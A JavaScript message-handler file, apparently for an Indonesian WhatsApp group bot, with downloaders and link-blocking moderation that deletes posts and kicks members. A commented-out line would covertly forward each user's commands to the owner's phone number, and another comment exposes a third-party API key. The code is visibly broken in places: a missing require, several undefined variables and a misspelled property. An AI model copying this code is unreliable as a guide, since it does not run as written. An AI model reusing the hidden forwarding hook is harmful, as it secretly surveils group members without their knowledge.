/*
AMTI TIRU KTIPLEK KTIPLEK
NO ENC? WA 6288286326619

*/
process.on('uncaughtException', console.error)
require('./setting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const speed = require('performance-now')
const axios = require('axios')
const fsx = require('fs-extra')
const mark = `0@s.whatsapp.net`
const dns = require('dns');
const FormData = require('form-data')
const gtts = require('node-gtts')
const ytdl = require("ytdl-core")
const cheerio = require('cheerio');
const ms = require("ms");
const crypto = require('crypto')
const https = require('https')
const yts = require("yt-search")
const uploadImage = require('./lib/uploadImage')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { mediafireDl } = require('./database/mediafire.js')
const jsobfus = require('javascript-obfuscator')
const { exec, spawn, execSync } = ('child_process')
const { sswebDesktop, sswebTablet, sswebPhone } = require('./lib/ssweb')
const { Tiktok, ephoto, jarak, wallpaper, wikimedia, quotesAnime, aiovideodl, umma, ringtone, styletext } = require("./lib/scraper")
const LINODE_API_TOKEN = global.apilinode;
const API_TOKEN = global.apitokendo;
const moment = require('moment-timezone')
const { pickRandom, smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { 
getRegisteredRandomId, 
addRegisteredUser, 
createSerial, 
checkRegisteredUser 
} = require('./lib/register.js')
//==================================================//
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
const thumb = fs.readFileSync ('./KyyMedia/image/kyy.jpg')
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const pengguna = JSON.parse(fs.readFileSync('./KyyMedia/dbnye/wihh.json'))
const prem = require("./lib/premium");
const { pinterest } = require("./lib/pinterest")
const anon = require('./lib/menfess') 
const { TelegraPh } = require('./lib/uploader')
const { antiSpam } = require('./lib/antispam')
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const xeonverifieduser = JSON.parse(fs.readFileSync('./KyyMedia/dbnye/wihh.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./KyyMedia/dbnye/banned.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/enable/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/enable/antitoxic.json'));
let ntasing = JSON.parse(fs.readFileSync('./database/enable/antiasing.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/enable/antiwame.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/enable/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/enable/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/enable/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/enable/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/enable/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/enable/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/enable/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/enable/antilinkytvideo.json'));
    const { addSaldo, minSaldo, cekSaldo } = require("./lib/deposit");
let db_saldo = JSON.parse(fs.readFileSync("./lib/saldo.json"));
let depositPath = "./lib/deposit/"
const translate = require("@vitalets/google-translate-api");
const chatbot = JSON.parse(fs.readFileSync("./lib/chatbot.json"))
//==================================================//
module.exports = kyy = async (kyy, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

//WM By Rulzz, Titenono lek ko hapus le😹
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
//=================================================//

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"

    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
//=================================================//
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const botNumber = await kyy.decodeJid(kyy.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await kyy.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : true
const welcmm = m.isGroup ? wlcmm.includes(from) : true
const AntiLink = m.isGroup ? ntilink.includes(from) : true
const Jpm = m.isGroup ? ntilink.includes(from) : false 
const isBan = banned.includes(m.sender)
const isRegistered = checkRegisteredUser(m.sender)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
//const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var stime = Styles(`Good Night`)
 }
 if(time2 < "19:00:00"){
var stime = Styles(`Good Evening`)
 }
 if(time2 < "18:00:00"){
var stime = Styles(`Good Evening`)
 }
 if(time2 < "15:00:00"){
var stime = Styles(`Good Afternoon`)
 }
 if(time2 < "11:00:00"){
var stime = Styles(`Good Morning`)
 }
 if(time2 < "05:00:00"){
var stime = Styles(`Good Morning`)
 }
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	
const qtod = m.quoted? "true":"false"
const bii = JSON.parse(fs.readFileSync('./KyyMedia/dbnye/wihh.json').toString())
const isSeler = [botNumber, ...bii].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const jangan = m.isGroup ? ntilink.includes(m.chat) : false
const AntiVirtex = m.isGroup ? ntvirtex.includes(from) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const AntiWame = m.isGroup ? ntwame.includes(from) : false
//const AntiToxic = m.isGroup ? nttoxic.includes(from) : false
const AntiAsing = m.isGroup ? ntasing.includes(from) : false
const ChatBot = m.isGroup ? chatbot.includes(from) : false 
const antibot = true 
const cap = '${botname}'
//=================================================//
// FUNCTION

const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

const reply = async(teks) => {kyy.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}

kyy.autoshalat = kyy.autoshalat ? kyy.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? kyy.user.id : m.sender
	let id = m.chat 
    if(id in kyy.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`
    kyy.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete kyy.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }

const totalFitur = () =>{
            var mytext = fs.readFileSync("./hanako.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
      

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await kyy.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: fcall })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await kyy.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: fcall })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

async function igdl2(url) {
            let res = await axios("https://indown.io/");
            let _$ = cheerio.load(res.data);
            let referer = _$("input[name=referer]").val();
            let locale = _$("input[name=locale]").val();
            let _token = _$("input[name=_token]").val();
            let { data } = await axios.post(
              "https://indown.io/download",
              new URLSearchParams({
                link: url,
                referer,
                locale,
                _token,
              }),
              {
                headers: {
                  cookie: res.headers["set-cookie"].join("; "),
                },
              }
            );
            let $ = cheerio.load(data);
            let result = [];
            let __$ = cheerio.load($("#result").html());
            __$("video").each(function () {
              let $$ = $(this);
              result.push({
                type: "video",
                thumbnail: $$.attr("poster"),
                url: $$.find("source").attr("src"),
              });
            });
            __$("img").each(function () {
              let $$ = $(this);
              result.push({
                type: "image",
                url: $$.attr("src"),
              });
            });
          
            return result;
          }
          
                      const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}


// AUTO DOWNLOAD YOUTUBE SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`youtube.com|youtu.be`)) {
let lodingdonlod = `*[ Loaded ]* downloaded from the link`
const kyyvido = require('./lib/ytdl2')
const vido=await kyyvido.mp4(budy)
downloadMp3(budy)
const autod=`*Tittle:* ${vido.title}\n*Date:* ${vido.date}\n*Duration:* ${vido.duration}\n*Quality:* ${vido.quality}`
await kyy.sendMessage(m.chat,{ video: {url:vido.videoUrl}, caption: autod },{quoted:m})
}
// AUTO DOWNLOAD TIKTOK SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`tiktok.com`)){
reply('memuat..')
await Tiktok(budy).then(async resi => {
let taev = `Title : ${resi.title}
Author : ${resi.author}`
await kyy.sendMessage(from, {audio: {url: resi.audio}, mimetype: 'audio/mpeg', ptt: false})
await kyy.sendMessage(from, {video: {url: resi.nowm}, caption: taev})
}).catch((err) => reply('Maaf erjadi Kesalahan!')) // pengalih isu
}

const onlygc = () => {
kyy.sendMessage(m.chat, {
    text: `ʜɪɪ, ɪ'ᴍ *HANAKO AI* ᴀ ᴍᴜʟᴛɪᴘᴜʀᴘᴏsᴇ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ ᴛʜᴀᴛ ᴄᴀɴ ᴍᴀᴋᴇ ɪᴛ ᴇᴀsɪᴇʀ ғᴏʀ ʏᴏᴜ ᴛᴏ sᴏʟᴠᴇ ᴘʀᴏʙʟᴇᴍs ᴡɪᴛʜ ᴛʜᴇ ɪɴᴛᴇʀɴᴇᴛ ϙᴜɪᴄᴋʟʏ.\n\nɪᴅɴ:
ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ʙᴏᴛ, ᴋᴀᴍᴜ ᴅɪʜᴀʀᴀᴘᴋᴀɴ ᴍᴇᴍᴀsᴜᴋɪ ɢʀᴜᴘ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ\n\nᴍᴀᴜ sᴄʀɪᴘᴛ/sᴄ ɴʏᴀ? ᴋᴇᴛɪᴋ ${prefix}sᴄ ᴅɪ ɢʀᴜᴘ ʙᴏᴛ\n\n◦  *ᴠᴇʀꜱɪᴏɴ :* 6.0.0\n◦  *ᴀᴜᴛʜᴏʀ :* KyyXD\n◦  *ꜱʜᴏᴡ ᴍᴇɴᴜ :* .ᴍᴇɴᴜ`,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `Selamat ${salam}`,
        body: "H A N A K O A I",
        thumbnailUrl: "https://telegra.ph/file/6b37e95d2575a9e92a133.jpg",
        sourceUrl: "https://chat.whatsapp.com/I63ZtunEzyB79ttUGitPOc",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   kyy.sendMessage(m.chat, { audio: fs.readFileSync('./Vn/yayaya.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
   }
   
   if (command) {
if (!isCreator && !m.isGroup) return onlygc()
/*kyy.sendMessage('6288286326619' + "@s.whatsapp.net", { text: `▧ 「 *S P Y - C O M M A N D* 」\n│ ∘  *From*: ${m.sender.split("@")[0]}\n│ ∘  *Chat*: ${spychat}\n╰──────────────━` }, { quoted: m });*/
}

/*
if (ChatBot) {
if (!m.isGroup) return onlygc()
if (m.message) {
if (!text) return
  let api = await fetchJson(`https://api.itsrose.life/cai/chat?message=${spychat}&character_id=RQrrOj-UNdEV2_PC5D03US-27MZ7EUtaRH_husjbRQA&apikey=Rk-Salsabila`)
  results = api.result.message
  m.reply(result)
  }
}*/
//==================================================//
if (!kyy.public) {
if (!m.key.fromMe) return
}
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
kyy.sendPresenceUpdate('available', m.chat)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m KyyChat \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
            }
           

     
// Anti Link

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await kyy.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return kyy.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return kyy.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return kyy.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
kyy.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}

 // Antiwame by geekz
if (AntiWame)
if (chath.match(/(wa.me\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by geekz
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
kyy.sendMessage(from, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by geekz


//antiasing by geekz
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isCreator) {
} else
await kyy.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by geekz
if (AntiLinkYoutubeVid)
if (chath.match(/(youtu.be\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by geekz
if (AntiLinkYoutubeChannel)
if (chath.match(/(youtube.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by geekz
if (AntiLinkInstagram)
if (chath.match(/(instagram.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by geekz
if (AntiLinkFacebook)
if (chath.match(/(facebook.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by geekz
if (AntiLinkTelegram)
if (chath.match(/(t.me\/)/gi)) {
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by geekz
if (AntiLinkTiktok)
if (chath.match(/(tiktok.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by geekz
if (AntiLinkTwitter)
if (chath.match(/(twitter.com\/)/gi)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun `
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by geekz
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant 
}
})
/*kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
kyy.sendMessage(from, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
         //FUNCTION DEPOSIT
         
         /** antispam **/
if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
console.log(color('[ SPAM ]', 'red'), color('yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return m.reply('「 ❗ 」Beri Jeda 5Dtik Per Command Kak')
}

if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
console.log(color('[ SPAM ]', 'red'), color('yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return m.reply('「 ❗ 」Beri Jeda 5Dtik Per Command Kak')
}

if (isCmd && !isCreator) antiSpam.addFilter(from)

